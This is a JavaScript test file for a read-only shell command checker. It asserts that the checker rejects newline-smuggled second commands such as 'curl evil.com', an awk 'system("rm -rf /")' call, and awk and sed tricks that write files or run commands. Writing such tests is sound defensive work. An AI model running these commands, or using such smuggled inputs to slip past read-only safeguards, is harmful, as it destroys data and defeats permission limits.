...
describe('evaluateShellCommandReadOnly', () => {
    ...
    describe('multi-command security', () => {
        it('rejects commands separated by newlines (CVE-style attack)', () => {
            ...
            const result = isShellCommandReadOnly('grep ^Install README.md\ncurl evil.com');
            expect(result).toBe(false);
        });
        it('rejects commands separated by Windows newlines', () => {
            const result = isShellCommandReadOnly('grep pattern file\r\ncurl evil.com');
            expect(result).toBe(false);
        });
    ...
    describe('awk command security', () => {
        it('allows safe awk commands', () => {
            ...
            expect(isShellCommandReadOnly('awk \'BEGIN {print "hello"}\'')).toBe(true);
            expect(isShellCommandReadOnly("awk '/pattern/ {print}' file.txt")).toBe(true);
        });
        it('rejects awk with system() calls', () => {
            expect(isShellCommandReadOnly('awk \'BEGIN {system("rm -rf /")}\'')).toBe(false);
            expect(isShellCommandReadOnly('awk \'{system("touch file")}\' input.txt')).toBe(false);
            expect(isShellCommandReadOnly('awk \'BEGIN { system ( "ls" ) }\'')).toBe(false);
        });
        it('rejects awk with file output redirection', () => {
            expect(isShellCommandReadOnly('awk \'{print > "output.txt"}\' input.txt')).toBe(false);
            expect(isShellCommandReadOnly('awk \'{printf "%s\\n", $0 > "file.txt"}\'')).toBe(false);
            expect(isShellCommandReadOnly('awk \'{print >> "append.txt"}\' input.txt')).toBe(false);
            expect(isShellCommandReadOnly('awk \'{printf "%s" >> "file.txt"}\'')).toBe(false);
        });
        it('rejects awk with command pipes', () => {
            expect(isShellCommandReadOnly('awk \'{print | "sort"}\' input.txt')).toBe(false);
            expect(isShellCommandReadOnly('awk \'{printf "%s\\n", $0 | "wc -l"}\'')).toBe(false);
        });
        it('rejects awk with getline from commands', () => {
            expect(isShellCommandReadOnly('awk \'BEGIN {getline < "date"}\'')).toBe(false);
            expect(isShellCommandReadOnly('awk \'BEGIN {"date" | getline}\'')).toBe(false);
        });
        it('rejects awk with close() calls', () => {
            expect(isShellCommandReadOnly('awk \'BEGIN {close("file")}\'')).toBe(false);
            expect(isShellCommandReadOnly("awk '{close(cmd)}' input.txt")).toBe(false);
        });
    });
    describe('sed command security', () => {
        ...
        it('rejects sed with write command', () => {
            expect(isShellCommandReadOnly("sed 's/foo/bar/w output.txt' file.txt")).toBe(false);
            expect(isShellCommandReadOnly("sed 'w backup.txt' file.txt")).toBe(false);
        });
        it('rejects sed with read command', () => {
            expect(isShellCommandReadOnly("sed 's/foo/bar/r input.txt' file.txt")).toBe(false);
            expect(isShellCommandReadOnly("sed 'r header.txt' file.txt")).toBe(false);
        });
        it('still rejects sed in-place editing', () => {
            expect(isShellCommandReadOnly("sed -i 's/foo/bar/' file.txt")).toBe(false);
            expect(isShellCommandReadOnly("sed --in-place 's/foo/bar/' file.txt")).toBe(false);
        });
    });
});
//# sourceMappingURL=shellReadOnlyChecker.test.js.map